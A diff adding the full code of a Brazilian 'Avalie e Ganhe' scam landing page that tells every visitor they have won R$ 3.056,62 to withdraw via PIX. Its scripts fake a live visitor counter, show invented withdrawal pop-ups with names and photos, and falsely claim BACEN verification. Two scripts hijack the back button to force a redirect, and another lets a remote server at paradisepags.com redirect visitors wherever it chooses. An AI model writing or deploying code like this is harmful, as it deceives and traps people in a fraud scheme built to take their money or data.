@@ -1,0 +1,1044 @@
+﻿<html lang="pt-BR">
+   <script src="../utm-propagator.js"></script>
+
+<script>
+  (function() {
+    // Adiciona um histórico falso
+    history.pushState(null, null, location.href);
+
+    window.onpopstate = function () {
+      // Captura todos os parâmetros da URL
+      const params = window.location.search;
+
+      // Redireciona já com os parâmetros anexados
+      window.location.href = "../back" + params;
+    };
+  })();
+</script>
+
+</head>
+
+<link href="https://fonts.googleapis.com/css2?family=Arial:wght@700;800;900&display=swap" rel="stylesheet">
+
+
+<body>
+    <div id="audio-overlay">
+        <div class="overlay-content">
+            <div class="overlay-icon">
+                <i class="fas fa-volume-up"></i>
+            </div>
+            <p class="overlay-text">Clique abaixo para ouvir as instruções e sacar SEU DINHEIRO!</p>
+            <button class="overlay-button" onclick="startExperience()">OUVIR INSTRUÇÕES</button>
+        </div>
+    </div>
+
+    <audio id="bg-audio" src="instrucoes.mp3" loop></audio>
+
+    <script>
+        function startExperience() {
+            const audio = document.getElementById('bg-audio');
+            const overlay = document.getElementById('audio-overlay');
+            
+            // Tenta tocar o áudio
+            audio.play().then(() => {
+                console.log("Áudio iniciado com sucesso");
+            }).catch(error => {
+                console.log("Erro ao tocar áudio:", error);
+            });
+            
+            // Esconde o overlay
+            overlay.style.display = 'none';
+        }
+    </script>
+﻿
+
+    <script type="text/javascript">
+        var back_redirect_back_link = '../back';
+        history.pushState({}, "", location.href);
+        history.pushState({}, "", location.href);
+        window.onpopstate = function () {
+            setTimeout(function () {
+                location.href = back_redirect_back_link;
+            }, 0);
+        };
+    </script>
+
+ 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avalie e Ganhe - Sua Chance de Lucrar!</title>
+    <!-- Google Fonts: Poppins para um visual moderno e legível -->
+    <link href="css2" rel="stylesheet">
+    <!-- Font Awesome para ícones -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        :root {
+            --primary-color: #4CAF50;
+            /* Verde vibrante */
+            --secondary-color: #388E3C;
+            /* Verde mais escuro */
+            --accent-color: #FFC107;
+            /* Amarelo para destaque */
+            --text-dark: #333333;
+            --text-light: #f0f0f0;
+            --bg-light: #ffffff;
+            --bg-dark: #f8f9fa;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+
+            /* Fundo gradiente roxo/azul */
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: var(--text-dark);
+            overflow-x: hidden;
+            /* Evita rolagem horizontal */
+        }
+
+        .floating-coins {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+
+        .floating-coin {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            opacity: 0.6;
+            animation: float 10s ease-in-out infinite;
+        }
+
+        .floating-coin:nth-child(1) {
+            top: 10%;
+            left: 5%;
+            animation-delay: 0s;
+        }
+
+        .floating-coin:nth-child(2) {
+            top: 20%;
+            left: 85%;
+            animation-delay: 2s;
+            width: 40px;
+            height: 40px;
+        }
+
+        .floating-coin:nth-child(3) {
+            top: 70%;
+            left: 10%;
+            animation-delay: 4s;
+        }
+
+        .floating-coin:nth-child(4) {
+            top: 80%;
+            left: 90%;
+            animation-delay: 6s;
+            width: 45px;
+            height: 45px;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+            }
+
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+            }
+
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+        }
+        
+        .online-counter {
+  background: rgba(22, 163, 74, 0.1); /* fundo verde suave */
+  padding: 5px 12px;
+  border-radius: 20px;
+  font-size: 0.8rem;
+  color: #16A34A; /* texto verde */
+  font-weight: 700;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  margin-bottom: 15px;
+}
+
+.online-dot {
+  width: 8px;
+  height: 8px;
+  background: #16A34A; /* verde consistente */
+  border-radius: 50%;
+  animation: blink 1.5s infinite;
+}
+
+@keyframes blink {
+  0% { opacity: 1; }
+  50% { opacity: 0.3; }
+  100% { opacity: 1; }
+}
+
+
+
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 450px;
+            margin: auto;
+        }
+
+        .card {
+            background: var(--bg-light);
+            border-radius: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            animation: fadeInScale 0.8s ease-out;
+        }
+
+        @keyframes fadeInScale {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .logo-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-bar .icon-button {
+            background: none;
+            border: none;
+            font-size: 1.2rem;
+            color: #999;
+            cursor: pointer;
+            transition: color 0.3s ease;
+        }
+
+        .logo-bar .icon-button:hover {
+            color: var(--primary-color);
+        }
+
+        .logo-bar .inline-logo {
+            max-width: 169px;
+            height: auto;
+        }
+
+        .notification-bell {
+            position: relative;
+        }
+
+        .notification-dot {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            width: 10px;
+            height: 10px;
+            background-color: #FF0000;
+            border-radius: 50%;
+            border: 2px solid var(--bg-light);
+        }
+
+        .premio-text {
+  font-size: 1.1rem;
+  font-weight: 900; /* mais gordinha */
+  color: #00000; /* mesmo verde */
+  text-transform: uppercase;
+  margin-bottom: 20px;
+  letter-spacing: 1.2px;
+  text-align: center;
+  font-family: 'Arial', sans-serif;
+}
+
+
+
+        .gift-container {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .gift-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            20%,
+            50%,
+            80%,
+            100% {
+                transform: translateY(0);
+            }
+
+            40% {
+                transform: translateY(-15px);
+            }
+
+            60% {
+                transform: translateY(-7px);
+            }
+        }
+
+        .coins-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+
+        .coins-overlay .coin {
+            width: 40px;
+            height: 40px;
+            opacity: 0.8;
+            animation: rotateCoin 3s linear infinite;
+        }
+
+        .coins-overlay .coin:nth-child(odd) {
+            animation-delay: 0.5s;
+        }
+
+        .coins-overlay .coin:nth-child(even) {
+            animation-delay: 1.5s;
+        }
+
+        @keyframes rotateCoin {
+            from {
+                transform: rotateY(0deg);
+            }
+
+            to {
+                transform: rotateY(360deg);
+            }
+        }
+
+        .main-text {
+  font-size: 1.8rem;
+  font-weight: 900; /* mais gordinha */
+  color: #000000; /* preto */
+  margin-bottom: 25px;
+  line-height: 1.3;
+  font-family: 'Arial', sans-serif;
+}
+
+
+        .cta-button {
+  display: block;
+  background: linear-gradient(90deg, #28A745 0%, #2ecc71 100%); /* gradiente verde */
+  color: #ffffff; /* letras brancas para contraste */
+  padding: 15px 25px;
+  border-radius: 10px;
+  text-decoration: none;
+  font-size: 1.3rem;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 1px;
+  box-shadow: 0 8px 15px rgba(40, 167, 69, 0.3); /* sombra verde */
+  transition: all 0.3s ease;
+  position: relative;
+  overflow: hidden;
+  font-family: 'Arial', sans-serif; /* Arial */
+  animation: pulse 2s infinite ease-in-out;
+}
+
+.cta-button:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 12px 20px rgba(40, 167, 69, 0.4);
+}
+
+.cta-button::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: rgba(255, 255, 255, 0.3);
+  transform: skewX(-30deg);
+  transition: all 0.7s ease;
+}
+
+.cta-button:hover::before {
+  left: 100%;
+}
+
+/* animação pulse (mantida) */
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+  }
+  50% {
+    transform: scale(1.03);
+  }
+  100% {
+    transform: scale(1);
+  }
+}
+
+
+        h3 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+        }
+
+        .description {
+  font-size: 0.95rem;
+  line-height: 1.6;
+  color: #555;
+  margin-bottom: 20px;
+  font-family: 'Arial', sans-serif;
+  font-weight: 500; /* legível e elegante */
+}
+
+
+       .benefits {
+  list-style: none;
+  padding: 0;
+  margin-bottom: 30px;
+  font-family: 'Arial', sans-serif; /* Fonte Arial */
+}
+
+.benefits li {
+  display: flex;
+  align-items: center;
+  font-size: 0.9rem;
+  color: #666; /* cor do texto */
+  margin-bottom: 10px;
+  
+  font-family: 'Arial', sans-serif !important;
+
+}
+
+.benefits li i {
+  color: #2ecc71; /* mesma cor do body */
+  margin-right: 10px;
+  font-size: 1.1rem;
+}
+
+
+        .warning {
+  font-size: 0.9rem;
+  color: #FF0000; /* Vermelho para aviso */
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 20px;
+  font-family: 'Arial', sans-serif; /* Fonte Arial */
+}
+
+.warning i {
+  font-size: 1.1rem;
+}
+
+
+        footer {
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--text-light);
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+
+            .card {
+                padding: 20px;
+            }
+
+            .main-text {
+                font-size: 1.3rem;
+            }
+
+            .cta-button {
+                font-size: 1.1rem;
+                padding: 12px 20px;
+            }
+
+            .floating-coin {
+                width: 30px;
+                height: 30px;
+            }
+        }
+    
+   
+</style>
+
+
+    <div class="floating-coins">
+        <img src="images/coin.png" alt="Moeda" class="floating-coin" style="top: 10%; left: 5%;">
+        <img src="images/coin.png" alt="Moeda" class="floating-coin" style="top: 20%; left: 85%;">
+        <img src="images/coin.png" alt="Moeda" class="floating-coin" style="top: 70%; left: 10%;">
+        <img src="images/coin.png" alt="Moeda" class="floating-coin" style="top: 80%; left: 90%;">
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="logo-bar">
+                <button class="icon-button back-button">
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+                <img src="images/x.png" alt="Logo do Site" class="inline-logo">
+                <button class="icon-button notification-bell">
+                    <i class="fas fa-bell"></i>
+                    <span class="notification-dot"></span>
+                </button>
+            </div>
+            
+             <div class="online-counter">
+                <span class="online-dot"></span>
+                <span id="user-count">5.247</span> pessoas avaliando agora
+            </div>
+
+            <p class="premio-text">
+  <i class="fas fa-gift premio-icon"></i>
+  
+  
+  
+  <style>
+      .premio-icon {
+  color: #28a745;
+}
+
+  
+  
+</style>
+  MEUS PARABÉNS!! VOCÊ FOI O SURTUDO DA VEZ!!  <i class="fas fa-gift premio-icon"></i>
+
+</p>
+
+
+
+            <div class="gift-container">
+                <img src="images/img.png" alt="Prêmio" class="gift-image">
+                <div class="coins-overlay">
+                    <img src="images/coin.png" alt="Moeda" class="coin">
+                    <img src="images/coin.png" alt="Moeda" class="coin">
+                    <img src="images/coin.png" alt="Moeda" class="coin">
+                    <img src="images/coin.png" alt="Moeda" class="coin">
+                </div>
+            </div>
+
+            <h2 class="main-text">VOCÊ TEM <br> <div class="highlight-amount">R$ 3.056,62</div>  <br> PARA SACAR!</h2>
+
+            <a class="cta-button" href="/1/">
+  RESGATAR AGORA
+</a>
+
+<script>
+  const params = window.location.search;
+  document.querySelectorAll(".cta-button").forEach(btn => {
+    if (params) {
+      btn.href += params;
+    }
+  });
+  
+  
+</script>
+
+            
+       
+
+<style>
+
+.main-text {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: #000000;
+            margin-bottom: 25px;
+            line-height: 1.3;
+            font-family: 'Arial', sans-serif;
+        }
+
+        .highlight-amount {
+            background: linear-gradient(90deg, #28A745 0%, #2ecc71 100%);
+            color: #FFFFFF;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-weight: 900;
+            display: inline-block;
+            margin: 10px 0;
+            font-size: 1.3rem;
+            box-shadow: 0 4px 12px rgba(0, 82, 163, 0.3);
+        }
+
+.social-proof {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: -10px;
+  font-size: 0.85rem;
+  color: #374151;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+  opacity: 0.9;
+}
+
+.social-proof i {
+  color: #16a34a;
+  font-size: 0.9rem;
+}
+
+
+
+   
+</style>
+
+<script>
+    
+     let count = 5247; // Começar com ~5000 usuários
+            const counterEl = document.getElementById('user-count');
+            
+            function animateCounter(from, to, duration = 800) {
+                let startTime = null;
+                const step = (timestamp) => {
+                    if (!startTime) startTime = timestamp;
+                    const progress = Math.min((timestamp - startTime) / duration, 1);
+                    const current = Math.floor(from + (to - from) * progress);
+                    counterEl.innerText = current.toLocaleString('pt-BR');
+                    if (progress < 1) requestAnimationFrame(step);
+                };
+                requestAnimationFrame(step);
+            }
+            
+            function updateCounter() {
+                // Simular picos realistas: subir 50-300 pessoas ou descer 20-100 pessoas
+                const isIncrease = Math.random() > 0.4; // 60% de chance de aumentar
+                let change;
+                
+                if (isIncrease) {
+                    change = Math.floor(Math.random() * 250) + 50; // 50-300
+                } else {
+                    change = -(Math.floor(Math.random() * 80) + 20); // -20 a -100
+                }
+                
+                const newCount = Math.max(4500, count + change); // Mínimo de 4500
+                animateCounter(count, newCount, 1200);
+                count = newCount;
+            }
+            
+            // Atualizar a cada 4-8 segundos para parecer natural
+            setInterval(() => {
+                updateCounter();
+            }, Math.floor(Math.random() * 4000) + 4000);
+    
+let pessoas = Math.floor(Math.random() * 80) + 100; // 100–180
+const contador = document.getElementById("contadorPessoas");
+
+function atualizar() {
+  const variacao = Math.floor(Math.random() * 5) - 2; // -2 a +2 (mais real)
+  pessoas += variacao;
+
+  if (pessoas < 100) pessoas = 100;
+  if (pessoas > 180) pessoas = 180;
+
+  contador.textContent = pessoas;
+
+  // micro feedback visual (imperceptível, mas "vivo")
+  contador.style.transform = "scale(1.08)";
+  setTimeout(() => {
+    contador.style.transform = "scale(1)";
+  }, 120);
+
+  // tempo variável = comportamento humano
+  const proximoTempo = Math.floor(Math.random() * 2000) + 1800; // 1.8s – 3.8s
+  setTimeout(atualizar, proximoTempo);
+}
+
+setTimeout(atualizar, 1500);
+</script>
+
+<link rel="stylesheet" href="../ajax/libs/font-awesome/6.5.0/css/all.min-2.css">
+
+
+
+
+ <br>
+
+            <h3>Como funciona?</h3>
+            <style>
+                h3 {
+  font-size: 1.1rem;
+  font-weight: 800; /* negrito gordinho */
+  color: var(--primary-color);
+  margin-bottom: 15px;
+  font-family: 'Arial', sans-serif;
+}
+
+            
+  
+</style>
+
+            <p class="description">
+Basta apenas avaliar e, ao final, sacar tudo diretamente no seu PIX.         </p>
+
+<style>
+    .description {
+  text-transform: uppercase;
+  font-size: 13px;
+  letter-spacing: 0.6px;
+}
+
+
+
+        #audio-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .overlay-content {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            animation: fadeInScale 0.5s ease-out;
+        }
+        .overlay-icon {
+            font-size: 50px;
+            color: #2ecc71; /* Verde */
+            margin-bottom: 20px;
+        }
+        .overlay-text {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 25px;
+            font-family: 'Arial', sans-serif;
+        }
+        .overlay-button {
+            background: #2ecc71; /* Verde */
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            text-transform: uppercase;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s;
+            font-family: 'Arial', sans-serif;
+            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.4);
+        }
+        .overlay-button:active {
+            transform: scale(0.95);
+        }
+    </style>
+
+
+           <ul class="benefits">
+  <li><i class="fas fa-check-circle"></i> Saque rápido e seguro via PIX</li>
+  <li><i class="fas fa-check-circle"></i> Processo verificado pelo BACEN</li>
+  <li><i class="fas fa-check-circle"></i> Sem taxas ocultas - tudo transparente</li>
+</ul>
+
+     
+
+
+<p class="warning">
+  <i class="fas fa-clock"></i>
+  RESTAM POUCAS VALIDAÇÕES HOJE!
+</p>
+
+        </div>
+        <footer>
+            <p> Aviso legal: A pesquisa GANHE PIX segue todas as diretrizes comerciais aplicáveis e
+    possui regras claras de participação. Os valores, prazos e condições podem variar
+    conforme o perfil do usuário. Consulte os termos antes de participar.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // ======== Preserva UTMs em todos os links com a classe "elementor-button-link" ========
+            const queryParams = window.location.search;
+            document.querySelectorAll("a.elementor-button-link").forEach(button => {
+                if (queryParams) {
+                    const currentUrl = button.getAttribute("href");
+                    const separator = currentUrl.includes("?") ? "&" : "?";
+                    button.href = currentUrl + separator + queryParams.slice(1);
+                }
+            });
+
+            // ======== Animações de entrada para elementos do card ========
+            const elementsToAnimate = document.querySelectorAll('.premio-text, .gift-container, .main-text, .cta-button, h3, .description, .benefits, .warning, footer');
+            elementsToAnimate.forEach((el, i) => {
+                el.style.opacity = '0';
+                el.style.transform = 'translateY(20px)';
+                setTimeout(() => {
+                    el.style.transition = `all 0.6s ease-out ${i * 0.08}s`;
+                    el.style.opacity = '1';
+                    el.style.transform = 'translateY(0)';
+                }, 100);
+            });
+
+            // ======== Garante visibilidade das moedas flutuantes ========
+            const floatingCoins = document.querySelectorAll('.floating-coin');
+            floatingCoins.forEach(coin => {
+                coin.style.opacity = '0.6';
+            });
+        });
+    </script>
+
+
+    <script>
+        function redirecionar() {
+            var params = window.location.search;
+            window.location.href = '1.html' + params;
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Animações de entrada para elementos do card
+            const elementsToAnimate = document.querySelectorAll('.premio-text, .gift-container, .main-text, .cta-button, h3, .description, .benefits, .warning, footer');
+            elementsToAnimate.forEach((el, i) => {
+                el.style.opacity = '0';
+                el.style.transform = 'translateY(20px)';
+                setTimeout(() => {
+                    el.style.transition = `all 0.6s ease-out ${i * 0.08}s`;
+                    el.style.opacity = '1';
+                    el.style.transform = 'translateY(0)';
+                }, 100);
+            });
+
+            // Animação das moedas flutuantes (já no CSS, apenas garantir visibilidade)
+            const floatingCoins = document.querySelectorAll('.floating-coin');
+            floatingCoins.forEach(coin => {
+                coin.style.opacity = '0.6';
+            });
+        });
+    </script>
+    
+    <style>
+.notificacao {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  background: #ffffff;
+  color: #1f2937;
+  padding: 14px 18px;
+  border-radius: 12px;
+  font-size: 14px;
+  font-weight: 500;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.12);
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  opacity: 0;
+  pointer-events: none;
+  z-index: 9999;
+  transform: translateY(20px);
+  transition: all 0.4s ease;
+  border-left: 5px solid #16A34A;
+  max-width: 380px;
+}
+
+.notificacao.mostrar {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+.notificacao .foto {
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 2px solid #16A34A;
+  flex-shrink: 0;
+}
+
+.notificacao strong {
+  font-weight: 700;
+  color: #111827;
+}
+
+.notificacao .valor {
+  color: #16A34A;
+  font-weight: 700;
+}
+
+.notificacao .sub {
+  font-size: 12px;
+  color: #6b7280;
+}
+</style>
+
+
+<div id="notificacao" class="notificacao"></div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  const pessoasOriginal = [
+    { nome: "Isaac P.", foto: "images/h1isaac.jpg" },
+    { nome: "Cristiano R.", foto: "images/h2cristiano.jpg" },
+    { nome: "Carlos E.", foto: "images/h3carlos.jpg" },
+    { nome: "Cleber S.", foto: "images/h4cleber.jpg" },
+    { nome: "Bruno H.", foto: "images/h5.jpg" },
+    { nome: "Rodrigo B.", foto: "images/h6.jpg" },
+    { nome: "Felipe N.", foto: "images/h7.jpg" },
+    { nome: "Gustavo O.", foto: "images/h8.jpg" },
+    { nome: "Marcos A.", foto: "images/h9.jpg" },
+    { nome: "André L.", foto: "images/h10.jpg" },
+    { nome: "Thiago C.", foto: "images/h11.jpg" },
+    { nome: "Paulo C.", foto: "images/h12.jpg" },
+    { nome: "Ricardo S.", foto: "images/h13.jpg" },
+    { nome: "Daniel B.", foto: "images/h14.jpg" },
+
+    { nome: "Gisele M.", foto: "images/m1gisele.jpg" },
+    { nome: "Juliana M.", foto: "images/m2juliana.jpg" },
+    { nome: "Carol G.", foto: "images/m3carol.jpg" },
+    { nome: "Lana P.", foto: "images/m4lana.jpg" },
+    { nome: "Camila V.", foto: "images/m6.jpg" },
+    { nome: "Patrícia A.", foto: "images/m7.jpg" },
+    { nome: "Larissa G.", foto: "images/m8.jpg" },
+    { nome: "Beatriz T.", foto: "images/m9.jpg" },
+    { nome: "Ana B.", foto: "images/m10.jpg" },
+    { nome: "Vanessa L.", foto: "images/m11.jpg" },
+    { nome: "Aline C.", foto: "images/m12.jpg" },
+    { nome: "Marlene R.", foto: "images/m13.jpg" },
+    { nome: "Dalva N.", foto: "images/m14.jpg" }
+  ];
+
+  const valores = [
+    "R$ 3.056,62",
+    "R$ 1.842,10",
+    "R$ 2.419,90",
+    "R$ 987,44"
+  ];
+
+  function shuffle(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [array[i], array[j]] = [array[j], array[i]];
+    }
+    return array;
+  }
+
+  let pessoas = shuffle([...pessoasOriginal]);
+  let index = 0;
+
+  function mostrarNotificacao() {
+    if (index >= pessoas.length) {
+      pessoas = shuffle([...pessoasOriginal]);
+      index = 0;
+    }
+
+    const pessoa = pessoas[index++];
+    const valor = valores[Math.floor(Math.random() * valores.length)];
+    const notif = document.getElementById("notificacao");
+
+    notif.innerHTML = `
+      <img src="${pessoa.foto}" class="foto" alt="${pessoa.nome}">
+      <div>
+        <strong>${pessoa.nome}</strong> acabou de sacar <span class="valor">${valor}</span><br>
+        <span class="sub">Transferência confirmada via PIX</span>
+      </div>
+    `;
+
+    notif.classList.add("mostrar");
+
+    setTimeout(() => {
+      notif.classList.remove("mostrar");
+      setTimeout(mostrarNotificacao, 3500);
+    }, 2500);
+  }
+
+  setTimeout(mostrarNotificacao, 2000);
+
+});
+</script>
+
+<script>
+(function(){
+    var t = "c46911deb05e6201809604f080365a39";
+    var d = window.location.hostname;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://multi.paradisepags.com/api/anticlone-check.php?token=" + t + "&domain=" + d, true);
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            try {
+                var r = JSON.parse(xhr.responseText);
+                if (r.action === "redirect" && r.url) {
+                    window.location.href = r.url;
+                }
+            } catch(e){}
+        }
+    };
+    xhr.send();
+})();
+</script>
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D5TQKC3C77UECCBSG1JG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+
+</body>
+</html>
